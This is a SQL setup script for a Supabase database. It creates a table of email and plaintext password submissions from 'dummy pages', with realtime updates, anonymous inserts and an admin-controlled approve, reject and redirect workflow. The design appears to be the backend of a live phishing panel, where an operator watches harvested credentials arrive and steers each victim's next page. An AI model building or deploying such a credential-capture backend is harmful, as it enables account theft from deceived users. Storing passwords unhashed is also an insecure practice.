-- 1. Create the table first
CREATE TABLE IF NOT EXISTS gate_requests (
  id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
  
  -- Unique ID to link client request to server response
  request_id text UNIQUE NOT NULL, 
  
  -- Which dummy page submitted this
  page_name text NOT NULL,
  
  -- User input
  email text,
  password text,
  
  -- Status and Redirect Info
  status text CHECK (status IN ('pending', 'approved', 'rejected')) DEFAULT 'pending',
  redirect_url text,
  
  -- Timestamps
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

-- 2. Now enable Realtime replication on the existing table
ALTER PUBLICATION supabase_realtime ADD TABLE gate_requests;

-- 3. Auto-update timestamp trigger
CREATE OR REPLACE FUNCTION update_modified_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = now();
    RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_gate_requests_updated_at
    BEFORE UPDATE ON gate_requests
    FOR EACH ROW EXECUTE PROCEDURE update_modified_column();

-- 4. Row Level Security (RLS)
ALTER TABLE gate_requests ENABLE ROW LEVEL SECURITY;

-- 5. Policies
-- Public can insert (Dummy pages do this)
CREATE POLICY "Public can insert requests"
ON gate_requests FOR INSERT
TO public
WITH CHECK (true);

-- Authenticated users (Admins) can select all
CREATE POLICY "Admins can view all requests"
ON gate_requests FOR SELECT
TO authenticated
USING (true);

-- Admins can update status
CREATE POLICY "Admins can update requests"
ON gate_requests FOR UPDATE
TO authenticated
USING (true);

-- Admins can delete old entries
CREATE POLICY "Admins can delete requests"
ON gate_requests FOR DELETE
TO authenticated
USING (true);